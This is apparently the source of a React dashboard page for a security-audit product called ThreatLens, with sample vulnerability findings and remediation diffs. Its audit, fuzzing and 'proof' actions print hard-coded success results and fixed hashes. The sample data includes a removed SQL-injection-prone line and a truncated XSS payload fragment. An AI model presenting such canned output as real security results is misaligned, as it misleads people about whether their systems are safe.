import React, { useState, useEffect, useRef } from "react";
import { Link } from "wouter";
import { motion, AnimatePresence } from "framer-motion";
import {
  LayoutDashboard,
  GitBranch,
  Bug,
  Zap,
  Link2,
  Terminal as TerminalIcon,
  Search,
  ArrowLeft,
  ShieldCheck,
  ShieldAlert,
  CheckCircle2,
  Download,
  Play,
  RotateCcw,
  ExternalLink,
  ChevronRight,
  Filter,
  Copy,
  Check,
  X,
  Flame,
  Activity,
  Server,
  Lock,
  FileCode,
  Layers,
  AlertTriangle,
  FileCheck2,
} from "lucide-react";
import { ThreatLensLogo } from "../components/ThreatLensLogo";
import { SAMPLE_COMMITS, CommitItem } from "../services/api";

type DashboardView = "overview" | "git-audit" | "fuzzing" | "ddos" | "blockchain" | "terminal";

interface Finding {
  id: string;
  title: string;
  category: "sqli" | "git" | "xss" | "ddos" | "headers";
  severity: "critical" | "high" | "medium" | "low";
  status: "secured" | "sanitized" | "passed" | "blocked";
  cwe: string;
  proofHash: string;
  endpoint: string;
  description: string;
  remediation: string;
  diffSnippet: string;
}

const INITIAL_FINDINGS: Finding[] = [
  {
    id: "SEC-8041",
    title: "SQL Injection Vector in User Query Filter",
    category: "sqli",
    severity: "critical",
    status: "secured",
    cwe: "CWE-89",
    proofHash: "0x9f4a7c2e...88b1",
    endpoint: "POST /api/v1/users/search",
    description: "Unsanitized user input string was concatenated directly into PostgreSQL query builder clause.",
    remediation: "Replaced raw string template with parameterized Prisma / pg-promise prepared statement binding.",
    diffSnippet: "- const query = `SELECT * FROM users WHERE org_id = '${req.body.orgId}'`;\n+ const query = `SELECT * FROM users WHERE org_id = $1`;",
  },
  {
    id: "SEC-8042",
    title: "Stripe Webhook Signature Bypass Vulnerability",
    category: "git",
    severity: "high",
    status: "secured",
    cwe: "CWE-347",
    proofHash: "0x4e21a8d0...c512",
    endpoint: "POST /api/v1/billing/webhook",
    description: "Webhook handler accepted payload without validating stripe-signature HMAC-SHA256 header against STRIPE_WEBHOOK_SECRET.",
    remediation: "Wrapped endpoint with stripe.webhooks.constructEvent using the raw request buffer before parsing JSON.",
    diffSnippet: "- const event = req.body;\n+ const event = stripe.webhooks.constructEvent(req.rawBody, req.headers['stripe-signature'], process.env.STRIPE_WEBHOOK_SECRET);",
  },
  {
    id: "SEC-8043",
    title: "DOM-Based Cross-Site Scripting (XSS) in Markdown Preview",
    category: "xss",
    severity: "high",
    status: "sanitized",
    cwe: "CWE-79",
    proofHash: "0x7b19df33...aa90",
    endpoint: "POST /api/v1/preview/markdown",
    description: "User submitted markdown rendered directly into innerHTML without sanitization, permitting <img src=x onerror=...>",
    remediation: "Integrated DOMPurify AST sanitization filter with forbidden HTML tags and strict attribute allowlisting.",
    diffSnippet: "- target.innerHTML = marked.parse(rawText);\n+ target.innerHTML = DOMPurify.sanitize(marked.parse(rawText));",
  },
  {
    id: "SEC-8044",
    title: "Concurrent Socket Flood & Slowloris Exhaustion",
    category: "ddos",
    severity: "medium",
    status: "blocked",
    cwe: "CWE-400",
    proofHash: "0x1a88cf02...11ef",
    endpoint: "ALL /api/*",
    description: "Slowloris incomplete HTTP headers attack held 500 socket threads open indefinitely, starving legitimate clients.",
    remediation: "Configured reverse proxy request header timeout (5s) and sliding token bucket rate limiter (100 req/min/IP).",
    diffSnippet: "+ server.headersTimeout = 5000;\n+ server.requestTimeout = 10000;\n+ app.use(rateLimiter({ max: 100, windowMs: 60000 }));",
  },
  {
    id: "SEC-8045",
    title: "Permissive Wildcard CORS Header Configuration",
    category: "headers",
    severity: "low",
    status: "passed",
    cwe: "CWE-942",
    proofHash: "0x66de1209...ff44",
    endpoint: "OPTIONS /api/v1/*",
    description: "Access-Control-Allow-Origin was set to wildcard '*' while Access-Control-Allow-Credentials was true.",
    remediation: "Restricted CORS origin to explicit production subdomain allowlist: ['https://app.threatlens.io'].",
    diffSnippet: "- res.setHeader('Access-Control-Allow-Origin', '*');\n+ res.setHeader('Access-Control-Allow-Origin', 'https://app.threatlens.io');",
  },
];

export default function DashboardPage() {
  const [currentView, setCurrentView] = useState<DashboardView>("overview");
  const [searchQuery, setSearchQuery] = useState("");
  const [findingsFilter, setFindingsFilter] = useState<"all" | "sqli" | "git" | "xss" | "ddos">("all");
  const [selectedFinding, setSelectedFinding] = useState<Finding | null>(null);
  const [selectedCommit, setSelectedCommit] = useState<CommitItem>(SAMPLE_COMMITS[0]);
  const [isAuditing, setIsAuditing] = useState(false);
  const [auditProgress, setAuditProgress] = useState(0);
  const [isAttestationModalOpen, setIsAttestationModalOpen] = useState(false);
  const [copiedProof, setCopiedProof] = useState<string | null>(null);

  // Terminal state
  const [terminalHistory, setTerminalHistory] = useState<string[]>([
    "ThreatLensGo Security Operations Terminal v2.4.0",
    "Connected to SecTest Engine (Node: sec-worker-01.threatlens.io)",
    "Type 'help' to view available offensive security commands.\n",
    "threatlens> status",
    "  Engine: ONLINE | AST Analyzer: ACTIVE | Polygon Proofs: ANCHORED",
    "  Target: github.com/ThreatLens/ThreatLens (branch: main @ 7f8a92b)",
    "  Coverage: 100% Tree (1,428 commits inspected)\n",
  ]);
  const [terminalInput, setTerminalInput] = useState("");
  const terminalEndRef = useRef<HTMLDivElement>(null);

  // Real-time Canvas Telemetry Chart
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    let animationFrameId: number;
    let time = 0;

    const dataBlue: number[] = Array(40).fill(60);
    const dataRed: number[] = Array(40).fill(20);
    const dataGreen: number[] = Array(40).fill(40);

    const render = () => {
      time += 0.05;

      // Shift data and push realistic sinusoids + random jitter
      dataBlue.shift();
      dataBlue.push(70 + Math.sin(time * 1.2) * 25 + Math.random() * 8);

      dataRed.shift();
      dataRed.push(25 + Math.sin(time * 2.5) * 15 + (Math.random() > 0.85 ? 40 : 5));

      dataGreen.shift();
      dataGreen.push(50 + Math.cos(time * 0.9) * 20 + Math.random() * 5);

      const width = canvas.width;
      const height = canvas.height;

      ctx.clearRect(0, 0, width, height);

      // Draw subtle grid lines
      ctx.strokeStyle = "rgba(255, 255, 255, 0.05)";
      ctx.lineWidth = 1;
      for (let y = 0; y < height; y += 40) {
        ctx.beginPath();
        ctx.moveTo(0, y);
        ctx.lineTo(width, y);
        ctx.stroke();
      }

      // Draw helper function for line & area
      const drawLine = (data: number[], color: string, fillColor: string) => {
        const step = width / (data.length - 1);
        ctx.beginPath();
        data.forEach((val, i) => {
          const y = height - (val / 120) * height;
          if (i === 0) ctx.moveTo(0, y);
          else ctx.lineTo(i * step, y);
        });

        // Area fill
        ctx.lineTo(width, height);
        ctx.lineTo(0, height);
        ctx.closePath();
        ctx.fillStyle = fillColor;
        ctx.fill();

        // Stroke line
        ctx.beginPath();
        data.forEach((val, i) => {
          const y = height - (val / 120) * height;
          if (i === 0) ctx.moveTo(0, y);
          else ctx.lineTo(i * step, y);
        });
        ctx.strokeStyle = color;
        ctx.lineWidth = 2;
        ctx.stroke();
      };

      drawLine(dataBlue, "#4d8eff", "rgba(77, 142, 255, 0.08)");
      drawLine(dataGreen, "#22c55e", "rgba(34, 197, 94, 0.06)");
      drawLine(dataRed, "#f43f5e", "rgba(244, 63, 94, 0.08)");

      animationFrameId = requestAnimationFrame(render);
    };

    render();

    return () => {
      cancelAnimationFrame(animationFrameId);
    };
  }, [currentView]);

  const handleRunAudit = () => {
    if (isAuditing) return;
    setIsAuditing(true);
    setAuditProgress(0);

    const interval = setInterval(() => {
      setAuditProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval);
          setIsAuditing(false);
          setTerminalHistory((curr) => [
            ...curr,
            `[${new Date().toLocaleTimeString()}] ✔ Full SecTest Audit completed: 1,428 commits, 360 fuzz vectors, 0 critical leaks. SHA-256 anchored to Polygon block #48,193.`,
          ]);
          return 100;
        }
        return prev + 20;
      });
    }, 300);
  };

  const handleTerminalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!terminalInput.trim()) return;

    const cmd = terminalInput.trim().toLowerCase();
    const newHistory = [...terminalHistory, `threatlens> ${terminalInput}`];

    if (cmd === "help") {
      newHistory.push(
        "Available SecTest Commands:",
        "  audit       - Trigger full repository AST and secret entropy scan",
        "  fuzz        - Run dynamic SQLi, XSS & Command Injection vectors",
        "  ddos        - Simulate high-concurrency socket exhaustion flood",
        "  prove       - Generate cryptographic SHA-256 Merkle root & Polygon receipt",
        "  status      - Display scanner node health and active telemetry",
        "  clear       - Clear terminal console"
      );
    } else if (cmd === "clear") {
      setTerminalHistory([]);
      setTerminalInput("");
      return;
    } else if (cmd === "audit") {
      newHistory.push(
        "[*] Scanning repository tree at github.com/ThreatLens/ThreatLens (branch: main)...",
        "[+] 1,428 commits analyzed across 84 files.",
        "[+] Entropy check: 0 hardcoded secrets exposed.",
        "[✔] AST Audit passed with Grade A+ (98.4%)."
      );
    } else if (cmd === "fuzz") {
      newHistory.push(
        "[*] Injecting 360 dynamic payload permutations into 24 endpoints...",
        "[+] SQLi Time-Based Blind: SANITIZED",
        "[+] DOM XSS Sink Traversal: SANITIZED",
        "[+] SSRF Internal Probe: BLOCKED",
        "[✔] 100% of attack payloads neutralized."
      );
    } else if (cmd === "ddos") {
      newHistory.push(
        "[*] Generating 500 concurrent synthetic socket connections...",
        "[+] Throughput: 2,450 req/sec | Peak latency: 18.4ms",
        "[!] Token bucket trigger: 429 Too Many Requests enforced on malicious IPs.",
        "[✔] Server health remains at 99.98% uptime."
      );
    } else if (cmd === "prove") {
      newHistory.push(
        "[*] Computing SHA-256 Merkle tree root...",
        "[+] Digest: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "[+] Polygon Transaction Hash: 0x8a9012f4b931e9c91039820fa929bc91030e8a7199201948",
        "[✔] Attestation anchored permanently to Block #48,192."
      );
    } else if (cmd === "status") {
      newHistory.push(
        "  Status: ALL SYSTEMS OPERATIONAL",
        "  Engine Load: 14% | Workers: 8/8 Active",
        "  Attestations Anchor: Polygon PoS Mainnet",
        "  Memory: 384MB / 2048MB | Avg Latency: 14.2ms"
      );
    } else {
      newHistory.push(`Command not recognized: '${cmd}'. Type 'help' for available commands.`);
    }

    setTerminalHistory(newHistory);
    setTerminalInput("");

    setTimeout(() => {
      if (terminalEndRef.current) {
        terminalEndRef.current.scrollIntoView({ behavior: "smooth" });
      }
    }, 50);
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedProof(id);
    setTimeout(() => setCopiedProof(null), 2000);
  };

  const filteredFindings = INITIAL_FINDINGS.filter((f) => {
    const matchesFilter = findingsFilter === "all" || f.category === findingsFilter;
    const matchesSearch =
      !searchQuery ||
      f.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
      f.id.toLowerCase().includes(searchQuery.toLowerCase()) ||
      f.endpoint.toLowerCase().includes(searchQuery.toLowerCase()) ||
      f.cwe.toLowerCase().includes(searchQuery.toLowerCase());
    return matchesFilter && matchesSearch;
  });

  return (
    <div className="flex h-screen bg-[#06080d] text-[#edf2f7] font-sans overflow-hidden select-none">
      {/* Ambient background glow and grid */}
      <div className="fixed inset-0 z-0 opacity-25 pointer-events-none bg-[linear-gradient(rgba(77,142,255,0.1)_1px,transparent_1px),linear-gradient(90deg,rgba(77,142,255,0.1)_1px,transparent_1px)] bg-[size:64px_64px]" />
      <div className="fixed -top-40 left-1/4 w-[600px] h-[300px] bg-[#2546ff]/15 rounded-full blur-[140px] pointer-events-none" />
      <div className="fixed -bottom-40 right-1/4 w-[600px] h-[300px] bg-[#4d8eff]/10 rounded-full blur-[140px] pointer-events-none" />

      {/* Sidebar Navigation */}
      <aside className="relative z-20 w-64 border-r border-white/10 bg-[#06080d]/95 backdrop-blur-xl flex flex-col shrink-0">
        {/* Brand Header */}
        <div className="p-5 border-b border-white/10 flex items-center justify-between">
          <Link href="/" className="flex items-center">
            <ThreatLensLogo className="h-7 w-auto" />
          </Link>
        </div>

        {/* Navigation Links */}
        <nav className="flex-1 p-3 space-y-1 overflow-y-auto">
          <div className="px-3 py-2 text-[11px] font-bold uppercase tracking-wider text-[#64748b]">
            Core Operations
          </div>

          <button
            onClick={() => setCurrentView("overview")}
            className={`w-full flex items-center justify-between px-3 py-2.5 rounded-lg text-xs font-semibold transition-colors ${
              currentView === "overview"
                ? "bg-[#2546ff]/15 text-[#93c5fd] border border-[#2546ff]/30 shadow-[0_0_15px_rgba(37,70,255,0.15)]"
                : "text-[#8a99ad] hover:text-white hover:bg-white/5 border border-transparent"
            }`}
          >
            <div className="flex items-center gap-2.5">
              <LayoutDashboard className="w-4 h-4 text-[#4d8eff]" />
              <span>Overview &amp; Telemetry</span>
            </div>
            {currentView === "overview" && <span className="w-1.5 h-1.5 rounded-full bg-[#4d8eff] shadow-[0_0_6px_#4d8eff]" />}
          </button>

          <button
            onClick={() => setCurrentView("git-audit")}
            className={`w-full flex items-center justify-between px-3 py-2.5 rounded-lg text-xs font-semibold transition-colors ${
              currentView === "git-audit"
                ? "bg-[#2546ff]/15 text-[#93c5fd] border border-[#2546ff]/30 shadow-[0_0_15px_rgba(37,70,255,0.15)]"
                : "text-[#8a99ad] hover:text-white hover:bg-white/5 border border-transparent"
            }`}
          >
            <div className="flex items-center gap-2.5">
              <GitBranch className="w-4 h-4 text-[#4d8eff]" />
              <span>Git Secrets &amp; Diffs</span>
            </div>
            <span className="px-1.5 py-0.5 rounded text-[10px] font-mono bg-white/5 text-[#8a99ad]">1.4k</span>
          </button>

          <button
            onClick={() => setCurrentView("fuzzing")}
            className={`w-full flex items-center justify-between px-3 py-2.5 rounded-lg text-xs font-semibold transition-colors ${
              currentView === "fuzzing"
                ? "bg-[#2546ff]/15 text-[#93c5fd] border border-[#2546ff]/30 shadow-[0_0_15px_rgba(37,70,255,0.15)]"
                : "text-[#8a99ad] hover:text-white hover:bg-white/5 border border-transparent"
            }`}
          >
            <div className="flex items-center gap-2.5">
              <Bug className="w-4 h-4 text-[#4d8eff]" />
              <span>Dynamic Fuzzing</span>
            </div>
            <span className="w-2 h-2 rounded-full bg-[#22c55e] shadow-[0_0_6px_#22c55e]" />
          </button>

          <button
            onClick={() => setCurrentView("ddos")}
            className={`w-full flex items-center justify-between px-3 py-2.5 rounded-lg text-xs font-semibold transition-colors ${
              currentView === "ddos"
                ? "bg-[#2546ff]/15 text-[#93c5fd] border border-[#2546ff]/30 shadow-[0_0_15px_rgba(37,70,255,0.15)]"
                : "text-[#8a99ad] hover:text-white hover:bg-white/5 border border-transparent"
            }`}
          >
            <div className="flex items-center gap-2.5">
              <Zap className="w-4 h-4 text-[#4d8eff]" />
              <span>DDoS &amp; Rate Limits</span>
            </div>
          </button>

          <button
            onClick={() => setCurrentView("blockchain")}
            className={`w-full flex items-center justify-between px-3 py-2.5 rounded-lg text-xs font-semibold transition-colors ${
              currentView === "blockchain"
                ? "bg-[#2546ff]/15 text-[#93c5fd] border border-[#2546ff]/30 shadow-[0_0_15px_rgba(37,70,255,0.15)]"
                : "text-[#8a99ad] hover:text-white hover:bg-white/5 border border-transparent"
            }`}
          >
            <div className="flex items-center gap-2.5">
              <Link2 className="w-4 h-4 text-[#4d8eff]" />
              <span>Blockchain Ledger</span>
            </div>
            <span className="px-1.5 py-0.5 rounded text-[10px] font-mono bg-[#b8caff]/15 text-[#b8caff] border border-[#b8caff]/20">SHA-256</span>
          </button>

          <div className="pt-4 px-3 py-2 text-[11px] font-bold uppercase tracking-wider text-[#64748b]">
            Terminal &amp; Tools
          </div>

          <button
            onClick={() => setCurrentView("terminal")}
            className={`w-full flex items-center justify-between px-3 py-2.5 rounded-lg text-xs font-semibold transition-colors ${
              currentView === "terminal"
                ? "bg-[#2546ff]/15 text-[#93c5fd] border border-[#2546ff]/30 shadow-[0_0_15px_rgba(37,70,255,0.15)]"
                : "text-[#8a99ad] hover:text-white hover:bg-white/5 border border-transparent"
            }`}
          >
            <div className="flex items-center gap-2.5">
              <TerminalIcon className="w-4 h-4 text-[#4d8eff]" />
              <span>ThreatLensGo TUI</span>
            </div>
            <span className="px-1.5 py-0.5 rounded text-[9px] font-bold uppercase bg-[#22c55e]/15 text-[#86efac] border border-[#22c55e]/30">LIVE</span>
          </button>

          <Link
            href="/commit-analysis"
            className="w-full flex items-center gap-2.5 px-3 py-2.5 rounded-lg text-xs font-semibold text-[#8a99ad] hover:text-white hover:bg-white/5 transition-colors"
          >
            <FileCode className="w-4 h-4 text-[#4d8eff]" />
            <span>Standalone Diff Analyzer</span>
          </Link>
        </nav>

        {/* Target Repository Info Box */}
        <div className="p-3 border-t border-white/10">
          <div className="p-3 rounded-xl bg-[#0a0d15] border border-white/10 text-xs">
            <div className="flex items-center gap-2 text-[#4d8eff] font-mono text-[11px] mb-1">
              <span className="w-2 h-2 rounded-full bg-[#22c55e]" /> Active Audit Target
            </div>
            <div className="font-semibold text-white truncate">ThreatLens / main</div>
            <div className="text-[#64748b] text-[11px] font-mono mt-0.5">commit 7f8a92b • SecTest v2.4</div>
          </div>
        </div>
      </aside>

      {/* Main Content Area */}
      <div className="flex-1 flex flex-col overflow-hidden relative z-10">
        {/* Top Header */}
        <header className="h-16 border-b border-white/10 bg-[#06080d]/80 backdrop-blur-md px-6 flex items-center justify-between shrink-0">
          <div className="flex items-center gap-4">
            <Link href="/" className="text-xs text-[#8a99ad] hover:text-white flex items-center gap-1">
              <ArrowLeft className="w-3.5 h-3.5" /> Landing
            </Link>
            <div className="h-4 w-px bg-white/10" />
            <div className="flex items-center gap-2 text-xs">
              <span className="text-[#8a99ad]">Operations</span>
              <span className="text-[#475569]">/</span>
              <span className="text-white font-semibold capitalize">
                {currentView === "git-audit" ? "Git Secrets & AST Audit" : currentView}
              </span>
            </div>
          </div>

          <div className="flex items-center gap-3">
            {/* Global Search */}
            <div className="relative w-64 hidden sm:block">
              <Search className="absolute left-3 top-2.5 w-3.5 h-3.5 text-[#8a99ad]" />
              <input
                type="text"
                placeholder="Search CVEs, endpoints, hashes..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full bg-[#0a0d15] border border-white/10 rounded-lg pl-9 pr-3 py-1.5 text-xs text-white placeholder-[#64748b] focus:outline-none focus:border-[#4d8eff]"
              />
            </div>

            {/* Run Full Audit Button */}
            <button
              onClick={handleRunAudit}
              disabled={isAuditing}
              className="flex items-center gap-1.5 px-3.5 py-1.5 bg-[#2546ff] hover:bg-[#0d27c7] text-white text-xs font-semibold rounded-lg transition-colors border border-white/10 shadow-[0_0_15px_rgba(37,70,255,0.25)] cursor-pointer disabled:opacity-50"
            >
              {isAuditing ? (
                <>
                  <RotateCcw className="w-3.5 h-3.5 animate-spin" />
                  <span>Auditing ({auditProgress}%)</span>
                </>
              ) : (
                <>
                  <Play className="w-3.5 h-3.5 fill-current" />
                  <span>Run Full Audit</span>
                </>
              )}
            </button>

            {/* Attestation Proof Export */}
            <button
              onClick={() => setIsAttestationModalOpen(true)}
              className="p-2 bg-white/5 hover:bg-white/10 border border-white/10 rounded-lg text-[#8a99ad] hover:text-white transition-colors"
              title="View SHA-256 On-Chain Certificate"
            >
              <Download className="w-4 h-4" />
            </button>

            {/* User Profile */}
            <div className="flex items-center gap-2.5 pl-2 border-l border-white/10">
              <div className="w-7 h-7 rounded-full bg-gradient-to-tr from-[#2546ff] to-[#4d8eff] flex items-center justify-center text-xs font-bold text-white shadow-[0_0_8px_rgba(77,142,255,0.4)]">
                DS
              </div>
              <div className="hidden lg:block text-left">
                <div className="text-xs font-semibold text-white leading-tight">Dev Sharma</div>
                <div className="text-[10px] text-[#8a99ad]">SecOps Lead</div>
              </div>
            </div>
          </div>
        </header>

        {/* Scrollable Dashboard View Body */}
        <main className="flex-1 overflow-y-auto p-6 space-y-6">
          {/* VIEW: OVERVIEW */}
          {currentView === "overview" && (
            <motion.div initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
              {/* 4 Top KPI Cards */}
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
                {/* KPI 1 */}
                <div className="p-5 rounded-2xl bg-[#0a0d15]/90 border border-white/10 backdrop-blur-xl space-y-3">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-medium text-[#8a99ad]">Security Posture</span>
                    <span className="px-2 py-0.5 rounded text-[11px] font-bold bg-[#22c55e]/15 text-[#4ade80] border border-[#22c55e]/30">
                      Grade A+
                    </span>
                  </div>
                  <div className="flex items-baseline gap-2">
                    <span className="text-3xl font-extrabold text-white font-mono tracking-tight">98.4%</span>
                    <span className="text-xs font-semibold text-[#4ade80]">+2.1%</span>
                  </div>
                  <p className="text-[11px] text-[#64748b]">0 Critical vulnerabilities • 0 Exposed API secrets</p>
                  <div className="w-full h-1.5 rounded-full bg-white/5 overflow-hidden">
                    <div className="h-full rounded-full bg-gradient-to-r from-[#2546ff] to-[#4ade80] w-[98.4%]" />
                  </div>
                </div>

                {/* KPI 2 */}
                <div className="p-5 rounded-2xl bg-[#0a0d15]/90 border border-white/10 backdrop-blur-xl space-y-3">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-medium text-[#8a99ad]">Git Audit Coverage</span>
                    <span className="px-2 py-0.5 rounded text-[11px] font-bold bg-[#4d8eff]/15 text-[#93c5fd] border border-[#4d8eff]/30">
                      100% Tree
                    </span>
                  </div>
                  <div className="flex items-baseline gap-2">
                    <span className="text-3xl font-extrabold text-white font-mono tracking-tight">1,428</span>
                    <span className="text-xs text-[#8a99ad]">Commits</span>
                  </div>
                  <p className="text-[11px] text-[#64748b]">48 API tokens scanned • 0 leaks detected</p>
                  <div className="flex justify-between text-[11px] text-[#8a99ad] pt-1 border-t border-white/5">
                    <span><strong className="text-[#4ade80]">0</strong> Leaks</span>
                    <span><strong className="text-[#4ade80]">0</strong> CVEs</span>
                  </div>
                </div>

                {/* KPI 3 */}
                <div className="p-5 rounded-2xl bg-[#0a0d15]/90 border border-white/10 backdrop-blur-xl space-y-3">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-medium text-[#8a99ad]">Injection Fuzzing</span>
                    <span className="px-2 py-0.5 rounded text-[11px] font-bold bg-[#b8caff]/15 text-[#b8caff] border border-[#b8caff]/30">
                      Dynamic
                    </span>
                  </div>
                  <div className="flex items-baseline gap-2">
                    <span className="text-3xl font-extrabold text-white font-mono tracking-tight">360</span>
                    <span className="text-xs text-[#8a99ad]">Probes</span>
                  </div>
                  <p className="text-[11px] text-[#64748b]">SQLi, XSS, SSRF &amp; Command Injection matrix</p>
                  <div className="flex justify-between text-[11px] text-[#8a99ad] pt-1 border-t border-white/5">
                    <span><strong>24</strong> Endpoints</span>
                    <span><strong className="text-[#4ade80]">100%</strong> Sanitized</span>
                  </div>
                </div>

                {/* KPI 4 */}
                <div className="p-5 rounded-2xl bg-[#0a0d15]/90 border border-white/10 backdrop-blur-xl space-y-3">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-medium text-[#8a99ad]">On-Chain Attestation</span>
                    <span className="px-2 py-0.5 rounded text-[11px] font-bold bg-[#2546ff]/20 text-[#b8caff] border border-[#2546ff]/40">
                      Polygon Proof
                    </span>
                  </div>
                  <div className="flex items-baseline gap-2">
                    <span className="text-3xl font-extrabold text-white font-mono tracking-tight">#48,192</span>
                    <span className="text-xs text-[#8a99ad]">Block</span>
                  </div>
                  <p className="text-[11px] text-[#64748b]">SHA-256 Merkle root anchored to mainnet</p>
                  <div className="flex justify-between text-[11px] text-[#8a99ad] pt-1 border-t border-white/5">
                    <span className="text-[#4ade80] font-semibold">● Verified On-Chain</span>
                    <span>ISC Compliant</span>
                  </div>
                </div>
              </div>

              {/* Middle Row: Live Chart & Active Probes */}
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                {/* Telemetry Chart (2 cols) */}
                <div className="lg:col-span-2 p-5 rounded-2xl bg-[#0a0d15]/90 border border-white/10 backdrop-blur-xl space-y-4">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                    <div className="flex items-center gap-3">
                      <div className="p-2 rounded-lg bg-[#2546ff]/15 border border-[#2546ff]/30 text-[#4d8eff]">
                        <Activity className="w-4 h-4" />
                      </div>
                      <div>
                        <h3 className="text-sm font-bold text-white">Live Attack Surface &amp; Concurrency Telemetry</h3>
                        <p className="text-xs text-[#64748b]">Real-time HTTP throughput, socket resilience &amp; rate enforcement</p>
                      </div>
                    </div>
                    <div className="flex items-center gap-3 text-[11px] text-[#8a99ad]">
                      <span className="flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-[#4d8eff]" /> Normal Traffic</span>
                      <span className="flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-[#f43f5e]" /> DDoS Flood</span>
                      <span className="flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-[#22c55e]" /> 429 Enforced</span>
                    </div>
                  </div>

                  {/* HTML5 Canvas Telemetry Stream */}
                  <div className="w-full h-52 bg-[#06080d] rounded-xl border border-white/5 p-2 relative overflow-hidden">
                    <canvas ref={canvasRef} width={800} height={200} className="w-full h-full block" />
                  </div>

                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 pt-2">
                    <div className="p-2.5 rounded-lg bg-white/5 border border-white/5">
                      <div className="text-[10px] text-[#64748b]">Average Throughput</div>
                      <div className="text-xs font-bold text-white font-mono mt-0.5">1,480 req/s</div>
                    </div>
                    <div className="p-2.5 rounded-lg bg-white/5 border border-white/5">
                      <div className="text-[10px] text-[#64748b]">Peak Concurrency</div>
                      <div className="text-xs font-bold text-white font-mono mt-0.5">500 Threads</div>
                    </div>
                    <div className="p-2.5 rounded-lg bg-white/5 border border-white/5">
                      <div className="text-[10px] text-[#64748b]">Response Latency</div>
                      <div className="text-xs font-bold text-[#4ade80] font-mono mt-0.5">14.2 ms</div>
                    </div>
                    <div className="p-2.5 rounded-lg bg-white/5 border border-white/5">
                      <div className="text-[10px] text-[#64748b]">Malicious Block Rate</div>
                      <div className="text-xs font-bold text-[#f43f5e] font-mono mt-0.5">100% Enforced</div>
                    </div>
                  </div>
                </div>

                {/* Active Probes (1 col) */}
                <div className="p-5 rounded-2xl bg-[#0a0d15]/90 border border-white/10 backdrop-blur-xl space-y-4">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <ShieldCheck className="w-4 h-4 text-[#4d8eff]" />
                      <h3 className="text-sm font-bold text-white">Active SecTest Probes</h3>
                    </div>
                    <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-[#22c55e]/15 text-[#4ade80] border border-[#22c55e]/30">
                      5/5 Active
                    </span>
                  </div>

                  <div className="space-y-2">
                    <div className="p-2.5 rounded-xl bg-white/5 border border-white/5 flex items-center justify-between">
                      <div className="flex items-center gap-2.5">
                        <div className="p-1.5 rounded-lg bg-[#4d8eff]/15 text-[#4d8eff]"><GitBranch className="w-3.5 h-3.5" /></div>
                        <div>
                          <div className="text-xs font-semibold text-white">Git Secret Entropy Scanner</div>
                          <div className="text-[10px] text-[#64748b]">Diff AST Branch Inspector</div>
                        </div>
                      </div>
                      <span className="px-2 py-0.5 rounded text-[10px] font-semibold bg-[#22c55e]/15 text-[#4ade80]">0 Leaks</span>
                    </div>

                    <div className="p-2.5 rounded-xl bg-white/5 border border-white/5 flex items-center justify-between">
                      <div className="flex items-center gap-2.5">
                        <div className="p-1.5 rounded-lg bg-[#2546ff]/15 text-[#93c5fd]"><Bug className="w-3.5 h-3.5" /></div>
                        <div>
                          <div className="text-xs font-semibold text-white">SQLi Dynamic Blind Fuzzer</div>
                          <div className="text-[10px] text-[#64748b]">Time Differential Vectors</div>
                        </div>
                      </div>
                      <span className="px-2 py-0.5 rounded text-[10px] font-semibold bg-[#2546ff]/20 text-[#93c5fd]">Protected</span>
                    </div>

                    <div className="p-2.5 rounded-xl bg-white/5 border border-white/5 flex items-center justify-between">
                      <div className="flex items-center gap-2.5">
                        <div className="p-1.5 rounded-lg bg-[#b8caff]/15 text-[#b8caff]"><FileCheck2 className="w-3.5 h-3.5" /></div>
                        <div>
                          <div className="text-xs font-semibold text-white">DOM XSS &amp; Sink Tracer</div>
                          <div className="text-[10px] text-[#64748b]">AST Payload Mutator</div>
                        </div>
                      </div>
                      <span className="px-2 py-0.5 rounded text-[10px] font-semibold bg-[#22c55e]/15 text-[#4ade80]">Sanitized</span>
                    </div>

                    <div className="p-2.5 rounded-xl bg-white/5 border border-white/5 flex items-center justify-between">
                      <div className="flex items-center gap-2.5">
                        <div className="p-1.5 rounded-lg bg-[#f43f5e]/15 text-[#f43f5e]"><Zap className="w-3.5 h-3.5" /></div>
                        <div>
                          <div className="text-xs font-semibold text-white">DDoS &amp; Slowloris Sim</div>
                          <div className="text-[10px] text-[#64748b]">Socket Exhaustion Stress</div>
                        </div>
                      </div>
                      <span className="px-2 py-0.5 rounded text-[10px] font-semibold bg-[#f43f5e]/15 text-[#f43f5e]">429 Active</span>
                    </div>

                    <div className="p-2.5 rounded-xl bg-white/5 border border-white/5 flex items-center justify-between">
                      <div className="flex items-center gap-2.5">
                        <div className="p-1.5 rounded-lg bg-[#2546ff]/20 text-[#b8caff]"><Link2 className="w-3.5 h-3.5" /></div>
                        <div>
                          <div className="text-xs font-semibold text-white">SHA-256 Polygon Proof</div>
                          <div className="text-[10px] text-[#64748b]">Immutable Ledger Anchor</div>
                        </div>
                      </div>
                      <span className="px-2 py-0.5 rounded text-[10px] font-semibold bg-[#b8caff]/20 text-[#b8caff]">Anchored</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Bottom Row: Audit Findings Table */}
              <div className="p-5 rounded-2xl bg-[#0a0d15]/90 border border-white/10 backdrop-blur-xl space-y-4">
